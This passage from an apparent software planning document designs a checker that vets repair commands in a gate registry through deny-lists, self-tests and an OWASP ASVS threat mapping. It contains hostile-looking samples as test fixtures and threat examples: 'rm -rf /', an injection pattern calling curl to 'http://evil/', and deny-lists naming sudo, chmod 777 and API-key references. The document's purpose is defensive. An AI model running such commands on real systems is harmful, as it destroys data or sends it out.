| 9 | Where does the repair-command-checker self-test fingerprint guard the canonical gates.yaml? | Yes (port the route-ledger.cjs:300-309 fingerprint pattern) | Self-test must never mutate canonical config |
| 10 | Use `js-yaml` or vanilla regex parsing? | js-yaml (via the same pinned path gates-registry.cjs:42-44 uses) | Single yaml lib; gates-registry already loaded it |

**All 10 derivation calls are locked.**

---

## Section 9: Single Plan Recommendation

**ONE plan file**: `33-01-repair-instruction-contract-PLAN.md`

### 9.1 File-level changes

| File | Action | Estimated lines |
|------|--------|-----------------|
| `super-gsd/registry/gates.yaml` | edit (13 rows + 4 commands) | +60 (text + commands) |
| `super-gsd/scripts/lib/repair-command-checker.cjs` | new | +280 (lib + helpers) |
| `super-gsd/scripts/lib/repair-command-checker.test.cjs` | new (optional but recommended; mirrors route-ledger.test.cjs:1-144) | +80 |
| `super-gsd/scripts/lib/gates-registry.cjs` | edit (insert validation after line 53) | +10 |
| `super-gsd/scripts/lib/sgsd-mission-strip.ps1` | edit (line 259-271 extension) | +10 |
| `super-gsd/skills/sgsd-complete-milestone/SKILL.md` | edit (Step 6 SUMMARY template extension) | +10 |
| `super-gsd/scripts/lib/__fixtures__/repair-fixtures.yaml` (or inline in self-test) | new | +30 (or 0 if inline) |
| **TOTAL** | | **~480 lines added; 0 deleted** |

### 9.2 Single executor wave

All edits are independent files OR additive. No reorder dependency.
One executor dispatch at standard ATC tier (estimated `full` per
classifier: 4+ files, >100 lines).

### 9.3 Acceptance command checklist

ROADMAP:327-330 acceptance lines, plus standard:

```bash
# 1. Checker self-test passes
node super-gsd/scripts/lib/repair-command-checker.cjs --self-test
# expected: exit 0

# 2. Validation against canonical gates.yaml passes
node super-gsd/scripts/lib/repair-command-checker.cjs --validate
# expected: exit 0

# 3. All 13 gates have repair_instruction
[ "$(grep -c '^    repair_instruction:' super-gsd/registry/gates.yaml)" -ge 13 ]

# 4. rm -rf / fixture rejected
node -e "
  const c = require('./super-gsd/scripts/lib/repair-command-checker.cjs');
  const r = c.validateOneCommand('rm -rf /');
  process.exit(r.ok ? 1 : 0);
"
# expected: exit 0 (i.e. r.ok === false)

# 5. system-map fixture accepted
node -e "
  const c = require('./super-gsd/scripts/lib/repair-command-checker.cjs');
  const r = c.validateOneCommand('node super-gsd/tools/system-map/generate.cjs');
  process.exit(r.ok ? 0 : 1);
"
# expected: exit 0

# 6. gates-registry load throws on poisoned fixture
node -e "
  const fs = require('fs'), path = require('path'), os = require('os');
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(),'gr-'));
  fs.writeFileSync(path.join(tmp,'g.yaml'),
    'gates:\n  - name: bad\n    enforcement_mode: hard-halt\n    repair_command: \"rm -rf /\"\n');
  const gr = require('./super-gsd/scripts/lib/gates-registry.cjs');
  gr.resetCache();
  let threw = false;
  try { gr.loadGates(path.join(tmp,'g.yaml')); } catch(e) { threw = /4-AND/.test(e.message); }
  process.exit(threw ? 0 : 1);
"
# expected: exit 0
```

### 9.4 Tasks within the plan (suggested partition)

T1: New file `repair-command-checker.cjs` (lib + DENYLISTS + 4 predicate
fns + validateRepairCommands + validateOneCommand + assertEvery...).

T2: Self-test scaffold (--self-test branch, 14 assertions, fingerprint
guard, tmp fixture writes).

T3: Edit `gates.yaml` - add `repair_instruction:` to all 13 rows + 4
`repair_command:` lines (gates 5, 7, 9, 10).

T4: Edit `gates-registry.cjs:38-55` - insert validateRepairCommands call
+ throw on violation; insert assertEveryBlockingGateHasInstruction
soft-warn.

T5: Edit `sgsd-mission-strip.ps1:259-271` - extend node expression to
fetch `repair_instruction`; append to blocker line.

T6: Edit `sgsd-complete-milestone/SKILL.md:103-114` (Step 6) - add
"## Unresolved Repairs" section template.

T7: Run all 6 acceptance commands; capture output for
`33-VERIFICATION.md`.

T7 is the verifier-row task (not new code). T1-T6 are 6 atomic commits
under standard per-dispatch-ATC review. Wave 0 is none required: tests
inline in --self-test, no test framework setup.

---

## Project Constraints (from CLAUDE.md)

- **CRIT: NEVER read or echo `.env` / settings.json env block** - this phase
  doesn't touch any secret-bearing file. Confirmed.
- **All shell via `bg_shell run`** - applies during executor invocations,
  not research output.
- **Commit after every unit; never batch** - T1..T6 = 6 commits.
- **NEVER ask for confirmation in autonomous mode** - all 10 derivation
  calls are locked above; planner consumes verbatim.
- **Stage files by name; never `git add -A`** - executor task plans must
  list specific paths.
- **CRITICAL/anti-slop checklist**: this phase ships ~480 lines added,
  0 deleted. New file count: 1 (or 2 with the .test.cjs). The lib
  follows an existing template (route-ledger.cjs); no new abstraction
  is invented. ATC tier: full (4 files + 480 lines).

---

## Validation Architecture

### Test Framework

| Property | Value |
|----------|-------|
| Framework | Native Node CJS via `require.main === module` + custom assertion harness |
| Config file | none (matches crit-backlog.cjs and route-ledger.cjs precedent) |
| Quick run command | `node super-gsd/scripts/lib/repair-command-checker.cjs --self-test` |
| Full suite command | self-test is the full suite |

### Phase Requirements -> Test Map

| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|--------------|
| REPAIR-01 | All 13 gates have repair_instruction | integration | `grep -c '^    repair_instruction:' super-gsd/registry/gates.yaml` | YES (gates.yaml present) |
| REPAIR-02 | Optional repair_command allowed under predicate | unit | `node ... --self-test` (assertions 3, 9, 10, 11) | NO (Wave 0: create checker lib) |
| REPAIR-03 | Schema-load checker rejects offending commands | unit + integration | `node ... --self-test` (assertions 4-8) + acceptance #6 | NO (Wave 0) |
| REPAIR-04 | Mission Strip surfaces text; milestone close lists | smoke | manual: run `sgsd-mission-control.ps1` 10s, observe Q4; run `sgsd-complete-milestone v1.7` (idempotent skip if already shipped) | YES (mission strip + skill exist; extension validated by integration test) |

### Sampling Rate

- **Per task commit**: `node super-gsd/scripts/lib/repair-command-checker.cjs --self-test`
- **Per wave merge**: same + acceptance command #2 (`--validate`)
- **Phase gate**: all 6 acceptance commands green before `/gsd-verify-work`

### Wave 0 Gaps

- [ ] `super-gsd/scripts/lib/repair-command-checker.cjs` (new lib + self-test)
- [ ] No framework install required (vanilla Node)
- [ ] No fixture file required if assertions inline strings (recommended)

(If `super-gsd/scripts/lib/repair-command-checker.test.cjs` is added as a
sibling test file mirroring route-ledger.test.cjs, that's an additional
Wave 0 file; otherwise the --self-test branch absorbs all assertions.)

---

## Security Domain

`security_enforcement` is enabled (default). The 4-AND predicate IS the
security domain - every `repair_command:` is itself a potential
exec-injection. The deny-list approach matches OWASP ASVS:

### Applicable ASVS Categories

| ASVS Category | Applies | Standard Control |
|---------------|---------|-------------------|
| V2 Authentication | yes | `auth-free` predicate rejects token-bearing commands |
| V3 Session Management | no | n/a |
| V4 Access Control | yes | `safe` predicate rejects sudo / chmod 777 / mutations outside tree |
| V5 Input Validation | yes | The whole 4-AND is input validation against the `repair_command` string |
| V6 Cryptography | no | n/a (no key material handled) |

### Known Threat Patterns

| Pattern | STRIDE | Standard Mitigation |
|---------|--------|---------------------|
| Command injection via repair_command (e.g., `; curl http://evil/`) | Tampering | `local` deny-list catches `curl`/`wget`/URLs; `safe` deny-list catches shell-metacharacter patterns |
| Privilege escalation (sudo/chmod 777) | Elevation of Privilege | `safe` deny-list catches sudo and dangerous chmod |
| Auth-token leakage to logs | Information Disclosure | `auth-free` deny-list catches `$..._API_KEY` references; rejected commands never reach a log line |
| Destructive ops (rm -rf, DROP TABLE) | Tampering / DoS | `safe` deny-list catches them |
| Network exfiltration via repair_command | Information Disclosure | `local` deny-list catches all network verbs |
| Non-deterministic repair (race window) | Tampering | `deterministic` deny-list catches Date.now / $RANDOM / curl |

The checker is **defense-in-depth** with the orchestrator's 5 hard-stop
conditions. Even if a malicious operator commits a poisoned gates.yaml,
the load-time throw at `gates-registry.cjs:53` halts startup BEFORE the
orchestrator dispatches anything.

---

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| Free-form gate YAML with no repair contract | gates.yaml + mandatory repair_instruction + 4-AND-validated repair_command | Phase 33 (this) | Operator gets actionable repair text + safe autonomous repair candidates |
| Repair text scattered across docs / SKILL.md / agent prompts | Single source: gates.yaml | Phase 33 | Mission Strip and milestone-close read one canonical store |
| No schema-load validation of registry contracts | Load-time throw via gates-registry.cjs (post-Phase 33) | Phase 33 | Poisoned config halts startup, never the dispatch |

**Deprecated/outdated**: nothing - this is purely additive.

---

## Assumptions Log

| # | Claim | Section | Risk if Wrong |
|---|-------|---------|---------------|
| A1 | All 13 gates should carry repair_instruction (not just hard-halt) | Section 1 | Low - acceptance line `grep -c >= 13` is the literal test; cost is text |
| A2 | The 4 candidate repair_command commands (gates 5,7,9,10) actually pass 4-AND when invoked | Section 3 | Medium - need to verify the `--self-test` and `--dry-run` flags actually exist on those scripts; FALLBACK: omit the command, ship instruction-only |
| A3 | `gh auth status` is read-only (no network mutation) and could be exempted from the gh deny-list | Section 4.1 | Low - the regex includes `(?!auth\s+status)` but this is a positive assumption; if uncertain, drop the exemption and reject all `gh ` commands |
| A4 | Mission Strip's existing 6-line contract permits adding text to an existing line (vs adding a 7th) | Section 6.1 | Low - DISCUSS 28.2 locked SIX LINES not max-content-per-line; the strip already truncates lines so suffix is fine |
| A5 | Milestone-close SKILL.md Step 6 is the right insertion point for "Unresolved Repairs" | Section 6.2 | Low - Step 6 owns SUMMARY.md generation; the "rules learned / governance findings" pattern fits |

**A2 is the only medium-risk assumption.** Resolution: the planner
should insert a Wave-0 task that verifies `--self-test` / `--dry-run`
flags exist on `sgsd-recall.sh`, `sgsd-muda-audit.sh`, `sgsd-curate.sh`,
and `tools/token-audit/check.cjs` BEFORE the executor commits the four
`repair_command:` lines. If a flag is absent, the safe default is to
ship `repair_instruction:` only for that gate.

---

## Open Questions

None. All locked above. The planner consumes Sections 1-9 verbatim.

---

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| Node.js | repair-command-checker.cjs | YES | per project standard | none required |
| js-yaml | repair-command-checker.cjs (via gates-registry.cjs:42-44 pinned path) | YES | pinned at super-gsd/tools/plan-schema/node_modules/js-yaml | reuse pinned install |
| PowerShell | sgsd-mission-strip.ps1 edit | YES (Windows host) | per project standard | none |
| bash | acceptance commands #1, #2 invocation | YES (WSL via bg_shell) | per project standard | powershell.exe -Command equivalents |

**Missing dependencies with no fallback:** none.
**Missing dependencies with fallback:** none.

---

## Sources

### Primary (HIGH confidence) - all verified by direct repo Read

- `[VERIFIED: super-gsd/registry/gates.yaml:33-253]` - 13 gate rows, no
  existing repair_* fields (Grep confirmed)
- `[VERIFIED: super-gsd/scripts/lib/gates-registry.cjs:1-96]` - loader
  shape, insertion point at line 53
- `[VERIFIED: super-gsd/scripts/lib/route-ledger.cjs:1-444]` - precedent
  for closed-enum predicate validation, --self-test scaffold, fingerprint
  guard
- `[VERIFIED: super-gsd/scripts/lib/crit-backlog.cjs:1-264]` - precedent
  for self-test pattern, append-only writer, rendering helper
- `[VERIFIED: super-gsd/scripts/lib/sgsd-mission-strip.ps1:251-284]` - Q4
  blocker line, current crit-backlog read path
- `[VERIFIED: super-gsd/registry/command-envelope-v1.yaml:204-212]` - 3
  pre-declared repair reason_codes
- `[VERIFIED: super-gsd/skills/sgsd-complete-milestone/SKILL.md:103-114]`
  - Step 6 SUMMARY-write
- `[VERIFIED: super-gsd/scripts/lib/predicate-eval.cjs:1-96]` - existing
  predicate evaluation pattern (informational; we don't reuse but we
  match the throw-on-unknown-field discipline)
- `[VERIFIED: .planning/discussions/2026-04-26-mass-discuss.md:170, 208]`
  - 26.3 4-AND lock + 33=C lock
- `[VERIFIED: .planning/milestones/v1.7/REQUIREMENTS.md:32-37]` -
  REPAIR-01..04 verbatim
- `[VERIFIED: .planning/ROADMAP-AGENT.md:316-330]` - Phase 33 outputs +
  acceptance commands

### Secondary (MEDIUM confidence)

- `[CITED: 32-RESEARCH.md:1-80]` - precedent for the envelope-wrap +
  schema-without-consumer pattern (only used as architectural template;
  not load-bearing for Phase 33's correctness)

### Tertiary (LOW confidence)

- (none)

---

## Metadata

**Confidence breakdown:**

- Standard stack: HIGH - js-yaml + native Node CJS, both already in repo
- Architecture: HIGH - 1:1 mirror of route-ledger.cjs which is shipped
- Pitfalls: HIGH - 4-AND deny-lists exhaustively enumerated against
  DISCUSS verbatim disallowed shapes
- Security: HIGH - ASVS V4 + V5 mapped explicitly to deny-lists

**Research date:** 2026-04-27
**Valid until:** 2026-05-27 (gates.yaml schema is stable; reason_codes
are frozen; no upstream library churn risk)
